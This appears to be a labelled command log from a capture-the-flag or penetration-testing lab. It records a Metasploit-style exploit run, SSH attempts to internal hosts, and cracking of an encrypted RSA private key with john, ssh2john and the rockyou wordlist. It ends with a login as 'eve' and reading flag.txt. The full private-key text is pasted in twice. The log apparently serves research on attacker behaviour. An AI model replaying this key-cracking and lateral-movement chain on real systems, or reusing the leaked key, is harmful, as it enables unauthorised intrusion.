INPUT|71--75|U|1594800345|71|set RHOST 172.18.1.5|OUTPUT
INPUT|71--76|U|1594800358|71|set LHOST 10.1.135.83|OUTPUT
INPUT|71--77|A7 |1594800381|71|check|OUTPUT
INPUT|71--78|U|1594800621|71|exploit|OUTPUT
INPUT|71--79|A16 |1594800917|71|ssh 172.18.1.5|OUTPUT
INPUT|71--80|A16 |1594800988|71|ssh kocm@172.18.1.5|OUTPUT
INPUT|71--81|A16 |1594801091|71|ssh 172.18.1.5|OUTPUT
INPUT|71--82|U|1594801714|71|vi key|OUTPUT
INPUT|71--83|A14 |1594801758|71|john key|OUTPUT
INPUT|71--84|A14 |1594801766|71|john .-----BEGIN RSA PRIVATE KEY-----|OUTPUT
INPUT|71--85|U|1594801766|71|Proc-Type: 4|OUTPUT
INPUT|71--86|U|1594801766|71|DEK-Info: AES-128-CBC|OUTPUT
INPUT|71--87|U|1594801766|71|Ps9uCxB/vjzzEwZU+BjohF/sb/kaa+thfeYki9iFGqVQpHbPhdZU7JO2rKTU3w4k|OUTPUT
INPUT|71--88|U|1594801766|71|2OG1q9DAD07fQPpCmX5vqWAdmeaWq//2k3zRVsadFF3daPGjWs1f61j4/JqYBSDl|OUTPUT
INPUT|71--89|U|1594801766|71|yeX8g98mtBLBas7bUFuo4jVroEUaoF0fpa0Up+mOAC3rY3tsprpfofQu+uoXaRRJ|OUTPUT
INPUT|71--90|A10 |1594801766|71|Bq2CuS5LcqbfVfl9737XeC+DNls/AmkLmYU/1NLKp1hWSpx0/dfJu725tDOtR6zB|OUTPUT
INPUT|71--91|U|1594801766|71|9lS9eEPebv4V8mUNU+bsh5YQbVrVmryO9BRLBl4ZK82SO7tnyObpWfsa2jLGg4Mp|OUTPUT
INPUT|71--92|U|1594801766|71|N/jFdUnWSkA2wEgzupDZmPU6jyJ/BosOxJVkih4oQB1s9BO+HzI7oA5sDfO/gw1R|OUTPUT
INPUT|71--93|U|1594801766|71|BdC2V8RnF8i8gwppc2eenbU/PIdDTu6M2LTO4aAM5wxwKXgkTdJuUxmNH4DCFgZ+|OUTPUT
INPUT|71--94|U|1594801766|71|/DJyNP3xqCknFLIVTBwVSsHqnHSN6ZCl8BteFdRsf6kAj6qm1/cAfL73otlGZyR7|OUTPUT
INPUT|71--95|U|1594801766|71|5PHI1jf+WoJVaRKQLzFfaMrY0rhU6TsQTYdm2QYcSszE1fhLdXGNKpathYz1sUhe|OUTPUT
INPUT|71--96|U|1594801766|71|RPbgJfB0PuzwpzcKesh5j+AnjKQjZcG1vHnrgvDFnd5VNOOrTzdUnMA0DwwVwm2S|OUTPUT
INPUT|71--97|U|1594801766|71|vkjUvPbdIkQlNuBL0FWZl/2vHf/xWWex4Q0plLf7lRWJsCDtiKflKHL/SBFYVy0F|OUTPUT
INPUT|71--98|U|1594801766|71|TwKMZJ4885lBJfN3AG9kj4azCLK6IcAuRoxTmAtYrntQWLtDCHyaCW6dZItCtQK2|OUTPUT
INPUT|71--99|U|1594801766|71|pghYqk7inYawVLDG9f5ej+1MYQNfScZYpQ/IEH2jfbRgQsXj7zgtS9ewQoyqBY2o|OUTPUT
INPUT|71--100|U|1594801766|71|TC+mWTFkXW5YlN9Bu1uZ2CgYQJF0Dx1ns5x3IeF+U5z56KRqaKFJPfRQgTg62m7e|OUTPUT
INPUT|71--101|U|1594801766|71|0v/8aKPlPwfmS28OtxtE96zQI3SAAy7AdwkBepz5Pk9iotqIQPk5fY68wBG67v+a|OUTPUT
INPUT|71--102|U|1594801766|71|d712Dnn4OPYaqzMTyWz/dRiWcax9bFhNV+9Gp1OoA7hhBO5daLoul3EYx54vd8N3|OUTPUT
INPUT|71--103|U|1594801766|71|qJkjc4ljMYr9wvRRcWEhlvQV6LTk2FiYOY4tjRneLXMfsb2BUwSFDXDwDL4zVF5X|OUTPUT
INPUT|71--104|U|1594801766|71|rk6oUkbp2aFy5SgMwdlm6tc5sHVHVOLTfeyv7AvRUOaGXbbrUBw1rxgswjSO4V5q|OUTPUT
INPUT|71--105|U|1594801766|71|anC3ZW1EHY/nUmSq9myKG5rPdgFhqx7lPBb5eXSGcA+rFkxkQwbtROw73mu00IXl|OUTPUT
INPUT|71--106|U|1594801766|71|FKuYCbpmfnY0ZBxR9NVh/kRpv5VI013Mwqk2lcuJTc+mjlHOymyXAhY02j218KSm|OUTPUT
INPUT|71--107|U|1594801766|71|TleEMFlW9oXD56B21kVdPDP9McdLgC9//2pSh8sI5kJEsNd294g8ju/dDNC5kybN|OUTPUT
INPUT|71--108|U|1594801766|71|aqa9d+Nsbodr90LgBOFRdtxUeYihXLS2ZfXE5wYfTwX17ZIoFLuYamE6Og7AllVL|OUTPUT
INPUT|71--109|U|1594801767|71|uSoF68eAZXd6R9bL03s9HQvGkSZv8zaFlmK4wRVI5frYMlU5gzD5E/e6Id5X7uCQ|OUTPUT
INPUT|71--110|U|1594801767|71|pq5zI0lH1Vf4jlhYpD/PXMmULzR28OIOVrkcUeZPVlv+aIpLd6zbe8mfIEDCzH9G|OUTPUT
INPUT|71--111|U|1594801767|71|Q9Z2LPIWU200w5daHsXp/qukKdDn1CB4JinKvtLka3Q4i6EHj+Vp7bvhmFpapjdW|OUTPUT
INPUT|71--112|U|1594801767|71|/BXnD+JMm+w9ZTRsHqrXKsAEyVhM99hWoFz2k1s+Q003y/7I/0XmPETD4GJZAfqX|OUTPUT
INPUT|71--113|U|1594801767|71|WzolChBDCjWIMZ/9j5JREtzWX3s7+k32TFws/jPKzXEB21M2Szn23pkoXp+zyqT6|OUTPUT
INPUT|71--114|U|1594801767|71|bTXmV+hQf+gS7PjVRthqPONau6on19uDDVXNeuVygP4T8H5v6kAurFVX1rvkbaSm|OUTPUT
INPUT|71--115|U|1594801767|71|sCLJmNBb/7o7QR1Hhvo7NN1z85CJr9yxC6MqLbbcv91Mhb3w1Ce2eL+QnhgE86HE|OUTPUT
INPUT|71--116|U|1594801767|71|I0lvTSHTPFgvw00pV4bypACc28X+0YjRVRFOxqZxidw256pubOjRjIHIG5n6eMYk|OUTPUT
INPUT|71--117|U|1594801767|71|W3XiLqeGN7DLwY8X6RXfqafVQmJR6j3zB/PAoSVh25eTQwl2i1rgYzo0IGcdwUxN|OUTPUT
INPUT|71--118|U|1594801767|71|KHGCl8kHWe7ks3KT4+WU9uZZAhAECaWJvLzo2Ba6dst/Ke7KEtmGwv5ExUUvfHve|OUTPUT
INPUT|71--119|U|1594801767|71|0mt+olWJFSJa072UPuHe7gWdlexqh0l59q4ohOG+zJke1u74Br9wo6KIv54IqGVS|OUTPUT
INPUT|71--120|U|1594801767|71|y2O0rVCjsin3d2h9F0Fp0Xvc3EHZD7ct2HvZEV6x3kUlfdWeHKuF+7wUeTJfSmvq|OUTPUT
INPUT|71--121|U|1594801767|71|9+LnogQTclKAVk8htnrxBQh7aPLBAyTaXACAL31bB0ZXfh0yhJX6bXIe+EVPNaf6|OUTPUT
INPUT|71--122|U|1594801767|71|rJf/WLYf6/Lmfgv/ECF+VqdLPGkLT8dEgrajh9t2TaoU+/+mxtGXaJ7Iea9I+g9l|OUTPUT
INPUT|71--123|U|1594801767|71|22unE+jCDSQMF9IygWb8HfzBsruZ7IQ+/h7g7XDpEZrJf6+mdmbzBXLwlnnD1XG3|OUTPUT
INPUT|71--124|U|1594801767|71|FEJ08UNnUQsuqoD+vPxunBwkFv5b/5yt0XMu9tZdXk9AW9BdasCIE1bY+au0cnTX|OUTPUT
INPUT|71--125|U|1594801767|71|rjmFQ+KmCqH5lReI0Ai3fJ8pnZ2D3/m7AV/1llNaijp9NmriqK0jiVBpnEM+uH3a|OUTPUT
INPUT|71--126|U|1594801767|71|WtUQOqd4QS2S8MwjPoBZ0hpXOY0JX95EvWhp58uOy0/o8yYSbb+bZe7g0+MJuF9R|OUTPUT
INPUT|71--127|U|1594801767|71|Rj6xI5CiBdDo83VdQHlyaUawTlv/wUpqSRc9xsK/y2dLjzQhAD+QkWbm98jrcAGX|OUTPUT
INPUT|71--128|U|1594801767|71|Tlqk1XDm0e9sNcXus5d5pnTWeCH4bnwnQDo0Ot/KljNmnG11/FXuPFnAToOq52Az|OUTPUT
INPUT|71--129|U|1594801767|71|SqV4xTHhlfTZQcjVD+Rc44JkIFTr2gzDvcLOOMwcBf232/ySokL9xuMlLVc04Jy2|OUTPUT
INPUT|71--130|U|1594801767|71|pG3A2vBQ1t0A62BglfKCobl9JVRwFhIIh4dzevvvtCuWnXk7AhodGIVF2XnBezou|OUTPUT
INPUT|71--131|U|1594801767|71|q5ydQjEjf0ByejEAZt7EM14Ey9sHQhX83OWMb7Brqfzsfapkuplvnj1+kmIrKUaA|OUTPUT
INPUT|71--132|U|1594801767|71|ytH5k1zr7ZQ5k2FasEDPwdVjSQfOW8G3CJ8GgpFokCL+KiwfvR3mJBM5ubn0di2z|OUTPUT
INPUT|71--133|U|1594801767|71|UG2CX9gT4nU7h9RAhtu2p/F5FEGLVbX5GxJhvKP11MQqSsWI3OY3gTvG6campkyD|OUTPUT
INPUT|71--134|U|1594801767|71|r4aMTuuESZSksPLDMwgkYTvWp/qaNnVpqaSHe1p2hk2DvEhIH7eSkK9gAPBLkcJ7|OUTPUT
INPUT|71--135|U|1594801767|71|sah7VmkiXIRvhXdcVA/QXlpG7NfOVGfm/zVDfpWPAGUrGegNb3X5Y6QTzDE4lhcK|OUTPUT
INPUT|71--136|M14 |1594801822|71|john --wordlist=-----BEGIN RSA PRIVATE KEY-----|OUTPUT
INPUT|71--137|U|1594801822|71|Proc-Type: 4|OUTPUT
INPUT|71--138|U|1594801822|71|DEK-Info: AES-128-CBC|OUTPUT
INPUT|71--139|U|1594801822|71|Ps9uCxB/vjzzEwZU+BjohF/sb/kaa+thfeYki9iFGqVQpHbPhdZU7JO2rKTU3w4k|OUTPUT
INPUT|71--140|U|1594801822|71|2OG1q9DAD07fQPpCmX5vqWAdmeaWq//2k3zRVsadFF3daPGjWs1f61j4/JqYBSDl|OUTPUT
INPUT|71--141|U|1594801822|71|yeX8g98mtBLBas7bUFuo4jVroEUaoF0fpa0Up+mOAC3rY3tsprpfofQu+uoXaRRJ|OUTPUT
INPUT|71--142|A10 |1594801822|71|Bq2CuS5LcqbfVfl9737XeC+DNls/AmkLmYU/1NLKp1hWSpx0/dfJu725tDOtR6zB|OUTPUT
INPUT|71--143|U|1594801822|71|9lS9eEPebv4V8mUNU+bsh5YQbVrVmryO9BRLBl4ZK82SO7tnyObpWfsa2jLGg4Mp|OUTPUT
INPUT|71--144|U|1594801823|71|N/jFdUnWSkA2wEgzupDZmPU6jyJ/BosOxJVkih4oQB1s9BO+HzI7oA5sDfO/gw1R|OUTPUT
INPUT|71--145|U|1594801823|71|BdC2V8RnF8i8gwppc2eenbU/PIdDTu6M2LTO4aAM5wxwKXgkTdJuUxmNH4DCFgZ+|OUTPUT
INPUT|71--146|U|1594801823|71|/DJyNP3xqCknFLIVTBwVSsHqnHSN6ZCl8BteFdRsf6kAj6qm1/cAfL73otlGZyR7|OUTPUT
INPUT|71--147|U|1594801823|71|5PHI1jf+WoJVaRKQLzFfaMrY0rhU6TsQTYdm2QYcSszE1fhLdXGNKpathYz1sUhe|OUTPUT
INPUT|71--148|U|1594801823|71|RPbgJfB0PuzwpzcKesh5j+AnjKQjZcG1vHnrgvDFnd5VNOOrTzdUnMA0DwwVwm2S|OUTPUT
INPUT|71--149|U|1594801823|71|vkjUvPbdIkQlNuBL0FWZl/2vHf/xWWex4Q0plLf7lRWJsCDtiKflKHL/SBFYVy0F|OUTPUT
INPUT|71--150|U|1594801823|71|TwKMZJ4885lBJfN3AG9kj4azCLK6IcAuRoxTmAtYrntQWLtDCHyaCW6dZItCtQK2|OUTPUT
INPUT|71--151|U|1594801823|71|pghYqk7inYawVLDG9f5ej+1MYQNfScZYpQ/IEH2jfbRgQsXj7zgtS9ewQoyqBY2o|OUTPUT
INPUT|71--152|U|1594801823|71|TC+mWTFkXW5YlN9Bu1uZ2CgYQJF0Dx1ns5x3IeF+U5z56KRqaKFJPfRQgTg62m7e|OUTPUT
INPUT|71--153|U|1594801823|71|0v/8aKPlPwfmS28OtxtE96zQI3SAAy7AdwkBepz5Pk9iotqIQPk5fY68wBG67v+a|OUTPUT
INPUT|71--154|U|1594801823|71|d712Dnn4OPYaqzMTyWz/dRiWcax9bFhNV+9Gp1OoA7hhBO5daLoul3EYx54vd8N3|OUTPUT
INPUT|71--155|U|1594801823|71|qJkjc4ljMYr9wvRRcWEhlvQV6LTk2FiYOY4tjRneLXMfsb2BUwSFDXDwDL4zVF5X|OUTPUT
INPUT|71--156|U|1594801823|71|rk6oUkbp2aFy5SgMwdlm6tc5sHVHVOLTfeyv7AvRUOaGXbbrUBw1rxgswjSO4V5q|OUTPUT
INPUT|71--157|U|1594801823|71|anC3ZW1EHY/nUmSq9myKG5rPdgFhqx7lPBb5eXSGcA+rFkxkQwbtROw73mu00IXl|OUTPUT
INPUT|71--158|U|1594801823|71|FKuYCbpmfnY0ZBxR9NVh/kRpv5VI013Mwqk2lcuJTc+mjlHOymyXAhY02j218KSm|OUTPUT
INPUT|71--159|U|1594801823|71|TleEMFlW9oXD56B21kVdPDP9McdLgC9//2pSh8sI5kJEsNd294g8ju/dDNC5kybN|OUTPUT
INPUT|71--160|U|1594801823|71|aqa9d+Nsbodr90LgBOFRdtxUeYihXLS2ZfXE5wYfTwX17ZIoFLuYamE6Og7AllVL|OUTPUT
INPUT|71--161|U|1594801823|71|uSoF68eAZXd6R9bL03s9HQvGkSZv8zaFlmK4wRVI5frYMlU5gzD5E/e6Id5X7uCQ|OUTPUT
INPUT|71--162|U|1594801823|71|pq5zI0lH1Vf4jlhYpD/PXMmULzR28OIOVrkcUeZPVlv+aIpLd6zbe8mfIEDCzH9G|OUTPUT
INPUT|71--163|U|1594801823|71|Q9Z2LPIWU200w5daHsXp/qukKdDn1CB4JinKvtLka3Q4i6EHj+Vp7bvhmFpapjdW|OUTPUT
INPUT|71--164|U|1594801823|71|/BXnD+JMm+w9ZTRsHqrXKsAEyVhM99hWoFz2k1s+Q003y/7I/0XmPETD4GJZAfqX|OUTPUT
INPUT|71--165|U|1594801823|71|WzolChBDCjWIMZ/9j5JREtzWX3s7+k32TFws/jPKzXEB21M2Szn23pkoXp+zyqT6|OUTPUT
INPUT|71--166|U|1594801823|71|bTXmV+hQf+gS7PjVRthqPONau6on19uDDVXNeuVygP4T8H5v6kAurFVX1rvkbaSm|OUTPUT
INPUT|71--167|U|1594801823|71|sCLJmNBb/7o7QR1Hhvo7NN1z85CJr9yxC6MqLbbcv91Mhb3w1Ce2eL+QnhgE86HE|OUTPUT
INPUT|71--168|U|1594801823|71|I0lvTSHTPFgvw00pV4bypACc28X+0YjRVRFOxqZxidw256pubOjRjIHIG5n6eMYk|OUTPUT
INPUT|71--169|U|1594801823|71|W3XiLqeGN7DLwY8X6RXfqafVQmJR6j3zB/PAoSVh25eTQwl2i1rgYzo0IGcdwUxN|OUTPUT
INPUT|71--170|U|1594801823|71|KHGCl8kHWe7ks3KT4+WU9uZZAhAECaWJvLzo2Ba6dst/Ke7KEtmGwv5ExUUvfHve|OUTPUT
INPUT|71--171|U|1594801823|71|0mt+olWJFSJa072UPuHe7gWdlexqh0l59q4ohOG+zJke1u74Br9wo6KIv54IqGVS|OUTPUT
INPUT|71--172|U|1594801823|71|y2O0rVCjsin3d2h9F0Fp0Xvc3EHZD7ct2HvZEV6x3kUlfdWeHKuF+7wUeTJfSmvq|OUTPUT
INPUT|71--173|U|1594801823|71|9+LnogQTclKAVk8htnrxBQh7aPLBAyTaXACAL31bB0ZXfh0yhJX6bXIe+EVPNaf6|OUTPUT
INPUT|71--174|U|1594801823|71|rJf/WLYf6/Lmfgv/ECF+VqdLPGkLT8dEgrajh9t2TaoU+/+mxtGXaJ7Iea9I+g9l|OUTPUT
INPUT|71--175|U|1594801823|71|22unE+jCDSQMF9IygWb8HfzBsruZ7IQ+/h7g7XDpEZrJf6+mdmbzBXLwlnnD1XG3|OUTPUT
INPUT|71--176|U|1594801823|71|FEJ08UNnUQsuqoD+vPxunBwkFv5b/5yt0XMu9tZdXk9AW9BdasCIE1bY+au0cnTX|OUTPUT
INPUT|71--177|U|1594801823|71|rjmFQ+KmCqH5lReI0Ai3fJ8pnZ2D3/m7AV/1llNaijp9NmriqK0jiVBpnEM+uH3a|OUTPUT
INPUT|71--178|U|1594801824|71|WtUQOqd4QS2S8MwjPoBZ0hpXOY0JX95EvWhp58uOy0/o8yYSbb+bZe7g0+MJuF9R|OUTPUT
INPUT|71--179|U|1594801824|71|Rj6xI5CiBdDo83VdQHlyaUawTlv/wUpqSRc9xsK/y2dLjzQhAD+QkWbm98jrcAGX|OUTPUT
INPUT|71--180|U|1594801824|71|Tlqk1XDm0e9sNcXus5d5pnTWeCH4bnwnQDo0Ot/KljNmnG11/FXuPFnAToOq52Az|OUTPUT
INPUT|71--181|U|1594801824|71|SqV4xTHhlfTZQcjVD+Rc44JkIFTr2gzDvcLOOMwcBf232/ySokL9xuMlLVc04Jy2|OUTPUT
INPUT|71--182|U|1594801824|71|pG3A2vBQ1t0A62BglfKCobl9JVRwFhIIh4dzevvvtCuWnXk7AhodGIVF2XnBezou|OUTPUT
INPUT|71--183|U|1594801824|71|q5ydQjEjf0ByejEAZt7EM14Ey9sHQhX83OWMb7Brqfzsfapkuplvnj1+kmIrKUaA|OUTPUT
INPUT|71--184|U|1594801824|71|ytH5k1zr7ZQ5k2FasEDPwdVjSQfOW8G3CJ8GgpFokCL+KiwfvR3mJBM5ubn0di2z|OUTPUT
INPUT|71--185|U|1594801824|71|UG2CX9gT4nU7h9RAhtu2p/F5FEGLVbX5GxJhvKP11MQqSsWI3OY3gTvG6campkyD|OUTPUT
INPUT|71--186|U|1594801824|71|r4aMTuuESZSksPLDMwgkYTvWp/qaNnVpqaSHe1p2hk2DvEhIH7eSkK9gAPBLkcJ7|OUTPUT
INPUT|71--187|U|1594801824|71|sah7VmkiXIRvhXdcVA/QXlpG7NfOVGfm/zVDfpWPAGUrGegNb3X5Y6QTzDE4lhcK|OUTPUT
INPUT|71--188|U|1594801840|71|clear|OUTPUT
INPUT|71--189|U|1594801862|71|john --wordlist=/usr/share/wordlists/rockyou.txt key|OUTPUT
INPUT|71--190|A16 |1594801900|71|/usr/share/john/ssh2john.py key|OUTPUT
INPUT|71--191|A16 |1594801915|71|/usr/share/john/ssh2john.py key > key2|OUTPUT
INPUT|71--192|U|1594801920|71|john key@|OUTPUT
INPUT|71--193|U|1594801926|71|john key2|OUTPUT
INPUT|71--194|U|1594802185|71|john --wordlist=/usr/share/wordlists/rockyou.txt key@|OUTPUT
INPUT|71--195|U|1594802188|71|john --wordlist=/usr/share/wordlists/rockyou.txt key2|OUTPUT
INPUT|71--196|A16 |1594802241|71|cp key ./.ssh/id_rsa|OUTPUT
INPUT|71--197|U|1594802246|71|cd|OUTPUT
INPUT|71--198|A16 |1594802248|71|cd .ssh|OUTPUT
INPUT|71--199|M12 |1594802249|71|cat id_rsa|OUTPUT
INPUT|71--200|A16 |1594802276|71|ssh 10.1.17.4|OUTPUT
INPUT|71--201|M16 |1594802314|71|ssh eve@sh 10.1.17.4|OUTPUT
INPUT|71--202|U|1594802320|71|ssh eve@10.1.17.4|OUTPUT
INPUT|71--203|A10 |1594802342|71|ls|OUTPUT
INPUT|71--204|U|1594802346|71|openssl|OUTPUT
INPUT|71--205|U|1594802372|71|openssl rsa -in id_rsa -out key|OUTPUT
INPUT|71--206|A10 |1594802377|71|ls|OUTPUT
INPUT|71--207|A1 A9 A11 A17 |1594802379|71|cat key|OUTPUT
INPUT|71--208|U|1594802382|71|mv key id_rsa|OUTPUT
INPUT|71--209|U|1594802391|71|ssh eve@10.1.17.4|OUTPUT
INPUT|71--210|A10 |1594802461|71|ls|OUTPUT
INPUT|71--211|U|1594802464|71|cd top-secret/|OUTPUT
INPUT|71--212|A10 |1594802464|71|ls|OUTPUT
INPUT|71--213|M17 |1594802467|71|cat flag.txt|OUTPUT
